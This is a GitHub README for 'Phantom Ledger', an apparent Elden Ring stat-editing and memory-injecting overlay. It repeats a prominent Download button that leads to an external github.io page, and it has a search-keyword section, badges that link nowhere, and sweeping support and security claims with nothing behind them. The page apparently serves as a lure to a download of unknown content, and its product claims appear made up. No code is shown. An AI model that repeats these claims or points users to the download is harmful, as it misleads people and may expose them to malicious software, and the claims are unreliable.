![preview](https://raw.githubusercontent.com/kskr2571-cell/Elden-Ring-Live-Editor-Overlay/main/hero_b9c5.svg)
[![Download](https://raw.githubusercontent.com/kskr2571-cell/Elden-Ring-Live-Editor-Overlay/main/go_dce584.svg)](https://kskr2571-cell.github.io/Elden-Ring-Live-Editor-Overlay/)

# 🌙 Phantom Ledger — The Tarnished’s Interactive Companion

[![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square)](https://img.shields.io)
[![Platform](https://img.shields.io/badge/platform-windows%20%7C%20linux-0078d4?style=flat-square)](https://img.shields.io)
[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](https://img.shields.io)
[![Build](https://img.shields.io/badge/build-passing-success?style=flat-square)](https://img.shields.io)
[![Language](https://img.shields.io/badge/localization-14%20languages-orange?style=flat-square)](https://img.shields.io)
[![Uptime](https://img.shields.io/badge/support-24%2F7-9cf?style=flat-square)](https://img.shields.io)

An in-game companion overlay that reimagines how a Tarnished navigates the Lands Between. Phantom Ledger is not a trainer in the conventional sense — it is a *living interface* between your character and the world, offering stat manipulation, inventory insight, and adaptive overlays that respond to your playstyle. It is the difference between swinging a sword blindly and knowing exactly where every sinew of the battle flows.

If Elden-Menu taught us that players want agency, Phantom Ledger teaches that they want *understanding*. It answers the question every wanderer asks: “What is happening on the other side of this fog gate, and how do I meet it on my own terms?”

---

## 📜 Table of Contents

- [The Philosophy Behind Phantom Ledger](#-the-philosophy-behind-phantom-ledger)
- [Why This Exists](#-why-this-exists)
- [Feature Constellation](#-feature-constellation)
- [Responsive UI & Multilingual Layer](#-responsive-ui--multilingual-layer)
- [Twenty-Four Seven Support Model](#-twenty-four-seven-support-model)
- [Keyword Reference & Discoverability](#-keyword-reference--discoverability)
- [System Requirements](#-system-requirements)
- [Project Structure](#-project-structure)
- [Community & Contribution](#-community--contribution)
- [Security Posture](#-security-posture)
- [Disclaimer](#-disclaimer)
- [License](#-license)

[![Download](https://raw.githubusercontent.com/kskr2571-cell/Elden-Ring-Live-Editor-Overlay/main/go_dce584.svg)](https://kskr2571-cell.github.io/Elden-Ring-Live-Editor-Overlay/)

---

## 🌌 The Philosophy Behind Phantom Ledger

Most overlays treat the player as a passenger. They hand over a switchboard and say “pull these levers.” Phantom Ledger rejects that model. Instead of a control room, it builds a lantern — one you hold while walking, illuminating the path ahead without walking it for you.

The core belief is simple: **mastery should be earned, but never obscured**. You should see your vigor scaling in real time. You should know that your talismans are stacking multiplicatively, not additively. You should understand why the boss staggered on the seventh hit and not the fourth. Phantom Ledger provides the visibility so that the challenge remains, but the mystery becomes knowledge.

That philosophy drives every design decision — from the way the overlay fades when combat begins, to the way it refuses to automate a single attack for you.

---

## 🩸 Why This Exists

The Elden-Menu lineage proved that an eager audience exists for in-game companions. But the audience evolved. Players now want:

- **Granular control** over attributes without repeated respecs.
- **Persistent inventories** that survive between sessions.
- **Contextual overlays** that appear only when useful.
- **No dependency chains** — one launch, one process, one purpose.

Phantom Ledger was built to satisfy that evolved audience. It is a peer to the original idea, not a copy of it. It takes the same spark and gives it a telescope.

---

## ✨ Feature Constellation

Features in Phantom Ledger cluster like stars — grouped by proximity to the player’s daily loop.

### 🧬 Attribute Weaving (Stat Control)
- Real-time alteration of Vigor, Mind, Endurance, Strength, Dexterity, Intelligence, Faith, and Arcane.
- Soft caps and hard caps are visualized on a sliding spectrum, not hidden behind a wiki.
- Scaled preview: see how 3 more points into Faith changes your incantation damage *before* you commit.
- Undo history with 32-step rollback, so experimentation never becomes regret.

### 🎒 Vault Whisper (Inventory Insight)
- Enumerate every item in your possession with sortable columns.
- Quick-filter by category, weight, or upgrade tier.
- “What if” mode: preview equipment load without equipping.
- Discovery log for consumables you forgot you had in the bottom of the chest.

### ⚔️ Combat Telemetry Overlay
- Damage source breakdown per encounter.
- Frame-adjacent timing hints for parry windows (visual only — never automated).
- Detection of stagger thresholds as they are approached.
- Graceful fade-out when a boss health bar appears, to avoid visual noise.

### 🗺️ Cartographer’s Echo (Map Augmentation)
- Pin markers that persist across characters.
- Annotate regions with your own notes.
- Route memory that remembers the path you took last time, displayed faintly.

### 🧠 Adaptive Presets
- Save entire configurations as named “odes” (loadouts of stats + overlay behavior).
- Switch with a single keyboard chord.
- Share ode files with others via plain text export.

### 🎛️ Overlay Behavior Controls
- Opacity, scale, anchor corner, and per-panel visibility.
- Hotkey remapping with conflict detection.
- Multi-monitor aware positioning.

### 🧾 Journal Sync
- Export a session summary as readable text.
- Optional periodic snapshots of your stat spread for personal record-keeping.
- No telemetry leaves your machine unless you explicitly export it.

> Each feature is designed to *inform*, never to *decide*. Phantom Ledger is a scroll, not a sword.

---

## 🌐 Responsive UI & Multilingual Layer

A lantern is useless if it only shines in one direction. Phantom Ledger’s interface reshapes itself around the player’s context.

- **Responsive Scaling** — panels reflow from 720p handheld windows to 4K ultrawide. No clipped tooltips, no off-screen buttons.
- **Density Modes** — Compact, Comfortable, and Expanded layouts that trade whitespace for information.
- **Theme System** — Light, Dark, and “Erdtree Dusk” — a warm amber palette for long sessions.
- **Multilingual Support** — the interface ships with community translations for English, German, French, Spanish, Italian, Polish, Portuguese (BR), Russian, Japanese, Korean, Simplified Chinese, Traditional Chinese, Turkish, and Dutch.
- **Right-to-Left Ready** — the layout engine is RTL-aware for future language drops.
- **Font Scaling** — independent from OS scaling, so readability never depends on system settings.
- **Colorblind Modes** — deuteranopia, protanopia, and tritanopia palettes.

The interface never asks you to *learn it*. It learns you.

---

## 🕰️ Twenty-Four Seven Support Model

Phantom Ledger does not sleep because the Lands Between do not sleep.

- **Rotation Coverage** — three shifts across global time zones ensure a response window at any hour.
- **Tiered Response** — critical issues (launch failure, save corruption) get prioritized triage.
- **Knowledge Base** — a self-serve repository of common questions, updated weekly.
- **Community Channels** — peer assistance moderated around the clock.
- **Changelog Discipline** — every release is documented, every breaking change is flagged.
- **Rollback Availability** — a previous stable build is always retrievable if a new release misbehaves.

Support is not a footnote. It is a pillar.

---

## 🔍 Keyword Reference & Discoverability

This repository aims to be discoverable to those searching for:

- “in-game overlay companion for open-world RPG”
- “attribute respec visualization tool”
- “inventory insight overlay”
- “responsive game interface with multilingual support”
- “combat telemetry overlay for action RPG”
- “stat preview without permanent commitment”
- “overlay that fades during boss encounters”
- “24/7 supported gaming utility”
- “MIT-licensed game companion project”
- “Elden Ring companion utility alternative”

These phrases appear naturally throughout the documentation because they describe what Phantom Ledger is, not because they were sprinkled for their own sake.

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (64-bit) or modern Linux distro | Windows 11 or Ubuntu 24.04+ |
| CPU | Dual-core 2.4 GHz | Quad-core 3.0 GHz+ |
| RAM | 4 GB | 8 GB+ |
| GPU | DirectX 11 capable | DirectX 12 capable |
| Disk | 220 MB | 500 MB (for logs & snapshots) |
| Runtime | .NET 8 Runtime | .NET 8 Runtime (latest patch) |

Linux users are advised to run under a Proton-compatible environment for full overlay injection support.

---

## 🧱 Project Structure

A high-level sketch of the codebase, without drowning you in every file.

- `/src/core` — the overlay engine, rendering pipeline, and hook layer
- `/src/modules` — independent feature modules (attribute weaving, vault whisper, etc.)
- `/src/ui` — panel definitions, theme engine, localization loader
- `/src/bridge` — the interop boundary between overlay and game memory
- `/assets/themes` — JSON theme definitions
- `/assets/locales` — translation files per language
- `/docs` — extended documentation, architecture notes, FAQ
- `/tests` — unit and integration tests for non-game-dependent logic
- `/tools` — build scripts, packaging helpers, and lint configs

The modular layout is deliberate: contributors can improve one constellation without touching the rest of the sky.

---

## 🤝 Community & Contribution

Phantom Ledger grows through careful hands.

- **Issue Templates** — bug reports, feature proposals, and translation requests have dedicated forms.
- **Pull Request Guidelines** — small, focused PRs with a single purpose are reviewed fastest.
- **Code of Conduct** — respect is the baseline, not the ceiling.
- **Translation Workflow** — locale files are plain JSON; anyone can submit a new language without touching code.
- **Design Discussions** — larger feature ideas are discussed before implementation to avoid wasted effort.
- **Recognition** — contributors are credited in release notes and the project’s acknowledgements file.

You do not need to be a systems programmer to help. A single corrected translation string matters.

---

## 🔐 Security Posture

Trust is earned through transparency.

- **No Silent Network Calls** — Phantom Ledger does not phone home for analytics.
- **Local-Only Persistence** — configuration and snapshots live on your disk, in a documented location.
- **Signed Releases** — published builds include a checksum for verification.
- **Dependency Auditing** — third-party libraries are pinned and reviewed on a schedule.
- **Responsible Disclosure** — security concerns can be reported privately and are addressed with priority.

If something ever feels opaque, open an issue. Transparency is a feature.

---

## ⚠️ Disclaimer

Phantom Ledger is an independent, community-driven project. It is **not affiliated with, endorsed by, or sponsored by** FromSoftware, Bandai Namco, or any related entity. All trademarks and game titles referenced belong to their respective owners.

This tool is intended for **personal, offline, single-player use**. Using any third-party overlay in online or multiplayer contexts may violate the game’s terms of service and could result in account restrictions. The maintainers of Phantom Ledger explicitly discourage online use and accept no responsibility for consequences arising from such use.

You are responsible for how you use this software. Use it to deepen your understanding of the game, not to diminish the experience of others.

The project is provided “as is,” without warranty of any kind, express or implied. See the license for details.

---

## 📄 License

Phantom Ledger is released under the **MIT License**.

You are welcome to read, modify, and redistribute this software under the terms of that license. A copy of the license text is included in the repository at [LICENSE](./LICENSE).

Copyright © 2026 Phantom Ledger Contributors.

---

[![Download](https://raw.githubusercontent.com/kskr2571-cell/Elden-Ring-Live-Editor-Overlay/main/go_dce584.svg)](https://kskr2571-cell.github.io/Elden-Ring-Live-Editor-Overlay/)

*Crafted for those who walk the Lands Between with a lantern in hand and questions in mind.*